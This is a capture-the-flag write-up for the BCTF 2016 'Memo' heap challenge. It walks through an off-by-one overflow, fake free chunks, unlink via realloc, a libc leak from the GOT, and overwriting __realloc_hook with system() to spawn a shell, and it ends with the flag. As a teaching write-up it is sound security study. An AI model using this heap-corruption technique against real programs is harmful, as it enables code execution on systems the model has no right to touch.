## BCTF 2016 - Memo (Pwn 300)
##### 19-21/03/2016 (48hr)
___

### Description: 
nc 104.199.132.199 1980
___
### Solution

This was another heap exploitation challenge. Binary was fairly easy to analyze. Program iterates
over a simple menu:

```
	Welcome to simple memo manager.
	choose an action:
	1.show this page
	2.edit this page
	3.tear this page
	4.change your name
	5.change title
	6.exit
```

The only limitation that we have is that we can delete a page up to 3 times:

```assembly
.text:0000000000400974 tear_page_400974 proc near              ; CODE XREF: main_400A36+A5p
.text:0000000000400974     push    rbp
.text:0000000000400975     mov     rbp, rsp
.text:0000000000400978     sub     rsp, 10h
.text:000000000040097C     mov     eax, cs:page_changes_602050
.text:0000000000400982     cmp     eax, 2
.text:0000000000400985     jle     short MORE_PAGES_400996
.text:0000000000400987     mov     edi, offset aYouHaveNoMoreP ; "You have no more pages!"
.text:000000000040098C     call    _puts
.text:0000000000400991     jmp     locret_400A34
```

When we set the name, there's an off by one overflow:
```assembly
.text:000000000040092C set_name_40092C proc near               ; CODE XREF: main_400A36+B1p
.text:000000000040092C     push    rbp
.text:000000000040092D     mov     rbp, rsp
.text:0000000000400930     mov     edi, offset aInputYourNewNa ; "Input your new name:"
.text:0000000000400935     call    _puts
.text:000000000040093A     mov     eax, 0
.text:000000000040093F     call    set_name_internal_4007B3
.text:0000000000400944     pop     rbp
.text:0000000000400945     retn
.text:0000000000400945 set_name_40092C endp
```
set_name_internal() performs some kind of filtering; It reads up to 0x27 characters (one by one)
and when it encounter any of the '\n', '!', '?', '@', '"', '\'', '#', '%', '&' it stops. Finally,
a NULL byte is placed at the end of the string. If the 0x28th character is one of the blacklist
characters, loop stops and we can overwrite any of these characters beyond the end of the buffer.
Let's have a look at set_name_internal():
```assembly
.text:00000000004007B3 iterator_8= dword ptr -8
.text:00000000004007B3 ch_1= byte ptr -1
.text:00000000004007B3
.text:00000000004007B3     push    rbp
.text:00000000004007B4     mov     rbp, rsp
.text:00000000004007B7     sub     rsp, 10h
.text:00000000004007BB     mov     [rbp+iterator_8], 0
.text:00000000004007C2     mov     rax, cs:stdin
.text:00000000004007C9     mov     rdi, rax                    ; fp
.text:00000000004007CC     call    __IO_getc
.text:00000000004007D1     mov     [rbp+ch_1], al
.text:00000000004007D4
.text:00000000004007D4 LOOP_4007D4:                            ; CODE XREF: set_name_internal_4007B3+9Cj
.text:00000000004007D4     mov     rdx, cs:name_602040
.text:00000000004007DB     mov     eax, [rbp+iterator_8]
.text:00000000004007DE     cdqe
.text:00000000004007E0     add     rdx, rax
.text:00000000004007E3     movzx   eax, [rbp+ch_1]
.text:00000000004007E7     mov     [rdx], al
.text:00000000004007E9     cmp     [rbp+ch_1], 0Ah             ; \n
.text:00000000004007ED     jz      short BREAK_400851
.text:00000000004007EF     cmp     [rbp+ch_1], 21h             ; !
.text:00000000004007F3     jz      short BREAK_400851
.text:00000000004007F5     cmp     [rbp+ch_1], 3Fh             ; ?
.text:00000000004007F9     jz      short BREAK_400851
.text:00000000004007FB     cmp     [rbp+ch_1], 40h             ; @
.text:00000000004007FF     jz      short BREAK_400851
.text:0000000000400801     cmp     [rbp+ch_1], 22h             ; "
.text:0000000000400805     jz      short BREAK_400851
.text:0000000000400807     cmp     [rbp+ch_1], 27h             ; '
.text:000000000040080B     jz      short BREAK_400851
.text:000000000040080D     cmp     [rbp+ch_1], 23h             ; #
.text:0000000000400811     jz      short BREAK_400851
.text:0000000000400813     cmp     [rbp+ch_1], 25h             ; %
.text:0000000000400817     jz      short BREAK_400851
.text:0000000000400819     cmp     [rbp+ch_1], 26h             ; &
.text:000000000040081D     jz      short BREAK_400851
.text:000000000040081F     cmp     [rbp+iterator_8], 27h       ; i < 0x27 ?
.text:0000000000400823     jle     short GET_NEXT_400839       ; off by 1 error! -> you can overflow chunk metadata
.text:0000000000400825     mov     rdx, cs:name_602040
.text:000000000040082C     mov     eax, [rbp+iterator_8]
.text:000000000040082F     cdqe
.text:0000000000400831     add     rax, rdx
.text:0000000000400834     mov     byte ptr [rax], 0
.text:0000000000400837     jmp     short locret_400866
.text:0000000000400839 ; ---------------------------------------------------------------------------
.text:0000000000400839
.text:0000000000400839 GET_NEXT_400839:                        ; CODE XREF: set_name_internal_4007B3+70j
.text:0000000000400839     mov     rax, cs:stdin
.text:0000000000400840     mov     rdi, rax                    ; fp
.text:0000000000400843     call    __IO_getc
.text:0000000000400848     mov     [rbp+ch_1], al
.text:000000000040084B     add     [rbp+iterator_8], 1         ; ++i
.text:000000000040084F     jmp     short LOOP_4007D4
.text:0000000000400851 ; ---------------------------------------------------------------------------
.text:0000000000400851
.text:0000000000400851 BREAK_400851:                           ; CODE XREF: set_name_internal_4007B3+3Aj
.text:0000000000400851                                         ; set_name_internal_4007B3+40j ...
.text:0000000000400851     mov     rdx, cs:name_602040
.text:0000000000400858     mov     eax, [rbp+iterator_8]
.text:000000000040085B     cdqe
.text:000000000040085D     add     rdx, rax
.text:0000000000400860     movzx   eax, [rbp+ch_1]
.text:0000000000400864     mov     [rdx], al
.text:0000000000400866
.text:0000000000400866 locret_400866:                          ; CODE XREF: set_name_internal_4007B3+84j
.text:0000000000400866     leave
.text:0000000000400867     retn
.text:0000000000400867 set_name_internal_4007B3 endp
```

Let's disable ASLR for now, in order to simplify exploiting process. During startup, the initial
layout of the heap is:

```
		00603000  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00
name ->	00603010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		00603020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		00603030  00 00 00 00 00 00 00 00  81 00 00 00 00 00 00 00
page -> 00603040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		........
		006030A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030B0  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00
title-> 006030C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030E0  00 00 00 00 00 00 00 00  21 0F 02 00 00 00 00 00
```

If we overflow the name buffer, we can modify the "size" of the chunk for page buffer. But we can
only "shrink" the chunk because all allowed characters are < 0x81.

The idea here is to create a fake free chunk, and free the next/previous chunk, in order to trigger
unlink() and get an partialy arbitrary write. The problem with that is that free() does not get called 
directly; However we can call it through realloc(). Let's take a look at its source 
(https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L4173). The 1st check of realloc() 
is to see if the new size is smaller than the old:

```c
	if ((unsigned long)(oldsize) >= (unsigned long)(nb)) {
		/* already big enough; split below */
		newp = oldp;
		newsize = oldsize;
	}
	else {
		// more stuff
	}

	/* If possible, free extra space in old or extended chunk */

	assert((unsigned long)(newsize) >= (unsigned long)(nb));

	remainder_size = newsize - nb;

	if (remainder_size < MINSIZE) { /* not enough extra to split off */
		set_head_size(newp, newsize | (av != &main_arena ? NON_MAIN_ARENA : 0));
		set_inuse_bit_at_offset(newp, newsize);
	}
	else { /* split remainder */
		remainder = chunk_at_offset(newp, nb);
		set_head_size(newp, nb | (av != &main_arena ? NON_MAIN_ARENA : 0));
		set_head(remainder, remainder_size | PREV_INUSE |
		     (av != &main_arena ? NON_MAIN_ARENA : 0));
		/* Mark remainder as inuse so free() won't complain */
		set_inuse_bit_at_offset(remainder, remainder_size);
		_int_free(av, remainder, 1);
	}

	check_inuse_chunk(av, newp);
	return chunk2mem(newp);
```

By looking the above code, the attack plan is to enter the first if (the "else" branch is too big 
and will probably cause problems in our tampered heap) and then enter the 2nd else, to trigger
_int_free(). Because we're dealing with small bins, in order to achieve that we need to allocate
a large page (around 500 bytes) and then realloc' it down to 200. Then _int_free() will be called.
From there our goal is to "unlink" a chunk from free list to get an arbitrary write. Inside 
_int_free() (https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3782), the first "if" 
is false as we're dealing with small bins:
```c
	if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
	{
		// ...
	
```


Because the previous chunk is in use (the one that will be returned by realloc() and the next
is chunk is the wilderness chunk), we'll fall in this code:	
```c
    /*
      If the chunk borders the current high end of memory,
      consolidate into top
    */

    else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av->top = p;
      check_chunk(av, p);
    }
```

But most importantly after that, malloc_consolidate() is called:
```c
    /*
      If freeing a large space, consolidate possibly-surrounding
      chunks. Then, if the total unused topmost memory exceeds trim
      threshold, ask malloc_trim to reduce top.
      Unless max_fast is 0, we don't know if there are fastbins
      bordering top, so we cannot tell for sure whether threshold
      has been reached unless fastbins are consolidated.  But we
      don't want to consolidate on each free.  As a compromise,
      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
      is reached.
    */

    if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) {
      if (have_fastchunks(av))
		malloc_consolidate(av);
```

This is true because size increased with size of next chunk, which is the wilderness chunk,
which is veeeery big.


malloc_consolidate() (https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L4058)
tries to coalesce all free chunks in fastbins. The only free chunk in fastbins is the original page 
(as its size is < 0x81; remember we can overflow that). If previous chunk is free then unlink() will
be called which is our final goal:

```c
	if (!prev_inuse(p)) {
	        prevsize = p->prev_size;
	        size += prevsize;
	        p = chunk_at_offset(p, -((long) prevsize));
	        unlink(av, p, bck, fwd);
	}
```


Going back to our attack, first we overflow the size of the original page (with 0x40) (LSB is 0
which means that the previous chunk is free) and we set accordingly the free pointers to point
in .bss where we can find an address that points to the heap (we need to pass the check: fd->bk = P 
&& bk->fd = P).

```
		00603000  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00
		00603010  00 00 00 00 00 00 00 00  20 00 00 00 00 00 00 00
name ->	00603020  28 20 60 00 00 00 00 00  30 20 60 00 00 00 00 00
		00603030  20 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00
page ->	00603040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41
		00603050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41
		00603060  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41
		00603070  00 00 00 00 00 00 00 00  41 00 00 00 00 00 00 00
title->	00603080  28 20 60 00 00 00 00 00  30 20 60 00 00 00 00 00
		00603090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030A0  0A 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030B0  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00
		006030C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030E0  00 00 00 00 00 00 00 00  21 0F 02 00 00 00 00 00
```

After that, we realloc() the page to large size (500 bytes), and its new address will be at 0x6030F0.
Note here that malloc_consolidate() won't be called at this point. Then we realloc() again the
page with a much smaller size, to make the 2 fake free chunks (the one at name) and the other at initial
page to be coalesced. The chunk will be removed from free list and unlink() will be called.
In the above example we'll "unlink" a pointer at .bss (0x602028+0x18 = 0x602040) which is the pointer
to the name. After realloc() the heap will be:

```
		00603000  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00
		00603010  00 00 00 00 00 00 00 00  61 00 00 00 00 00 00 00
name ->	00603020  78 66 DD F7 FF 7F 00 00  78 66 DD F7 FF 7F 00 00
		00603030  20 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00
		00603040  00 00 00 00 00 00 00 00  41 41 41 41 41 41 41 41
page ->	00603050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41
		00603060  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41
		00603070  60 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00
		00603080  28 20 60 00 00 00 00 00  30 20 60 00 00 00 00 00
		00603090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030A0  0A 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030B0  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00
title->	006030C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		006030E0  00 00 00 00 00 00 00 00  A1 00 00 00 00 00 00 00
new ->	006030F0  42 41 52 20 42 41 52 20  42 41 52 20 42 41 52 20
page	00603100  42 41 52 20 42 41 52 20  42 41 52 20 42 41 52 20
		00603110  42 41 52 20 42 41 52 20  42 41 52 20 42 41 52 20
		00603120  42 41 52 20 42 41 52 20  42 41 52 20 42 41 52 20
		00603130  0A 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		00603140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		00603150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		00603160  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		00603170  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
		00603180  00 00 00 00 00 00 00 00  81 0E 02 00 00 00 00 00
```

But the important thing is that the address of name in .bss will be 0x602028 which is an address within
.bss! If we set name again, we can directly overwrite page and title pointers in .bss. Then we can set
title or page to get an arbitrary write.

The first idea was to overwrite a function in .got. However this ended up in a segmentation fault as
full RELRO is enabled and .got is read only. However we can read the .got and leak the libc addresses
that we want (we make page pointer point to .got and then we show the page). From there we can calculate
the address of system().


If we take a look at realloc() source 
(https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L2929), 
we can find something very interesting:
```c
  __malloc_ptr_t (*hook) (__malloc_ptr_t, size_t, const __malloc_ptr_t) = force_reg (__realloc_hook);
```

realloc() allows us to set hooks. If we ovewrite the address of the hook with system(), then we can
get a shell if we call realloc( "/bin/sh" ).

The last is to edit a page, and set its contents to /bin/sh. Then realloc() will be called,  with
pointer poitnting to that string. The hook function is not NULL, so the hook functcion will be called
first, which will give us a shell, which give us the flag: `BCTF{hell0_Mall0c_guru}`.

For more details take a look at the exploit code.
___